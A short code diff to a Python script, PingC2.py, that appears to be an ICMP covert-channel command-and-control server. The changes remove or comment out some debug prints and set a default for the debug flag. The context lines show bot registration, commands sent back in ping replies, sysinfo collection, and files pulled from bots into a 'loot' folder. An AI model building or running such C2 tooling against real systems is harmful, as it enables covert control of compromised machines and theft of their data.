@@ -163,7 +163,6 @@ def catchFile(request, botId):
        	filename = 'bot' + str(botId) + '_' + fileContents[2]
         filename_clean = filename.replace('/','_')
 	filename_clean = 'loot/' + filename_clean
-	printLine("[D] File contents: %s" % (fileContent),flag)
 	printLine("[*] Catching file (%s) from bot: %s" % (filename_clean,botId),flag)
 	if fileContents[0] == '(FILE_START)':
 		printLine("[*] File start: %s" % (filename_clean),flag)
@@ -332,7 +331,7 @@ def c2main(command,botShell,botConnect):
 						else:
 							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
                                                 	printLine("[*] Response sent to %s: %s" % (p['IP'].src,command.value),flag)
-							print "Option: "
+							#print "Option: "
                                         else:
                                         	printLine("[X] Client not registered",flag)
                         	# Checkin function
@@ -347,7 +346,7 @@ def c2main(command,botShell,botConnect):
                                         #resp.show2()
                                         #send(resp)
                                         printLine("\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value),flag)
-                                        print "Option: "
+                                        #print "Option: "
 				elif 'sysinfo' in request:
 					# Build sysinfo capture system database
                         		printLine("[D] Inside sysinfo",flag)
@@ -364,7 +363,7 @@ def c2main(command,botShell,botConnect):
                                 	#resp.show2()
                                 	printLine("\n[*] Response sent: Thanks",flag)
                                 	send(resp)
-                        		print "Option: "
+                        		#print "Option: "
 				elif '(FILE' in request:
 					if doesBotExist(int(request.split()[1])):
 						printLine("[D] Catching file",flag)
@@ -536,10 +535,12 @@ def main(flag):
 	
 if __name__ == "__main__":
 	global flag
+	flag = 0
 	parser = OptionParser(usage="%prog [-d]")
 	parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
 	(options, args) = parser.parse_args()	
-	flag = options.debug
+	if options.debug:
+		flag = options.debug
 	print "[D] flag = %s" % flag
 	printLine("--------------------------------------------",flag)
 	printLine("PingC2.py started on %s" % (date.today()),flag)
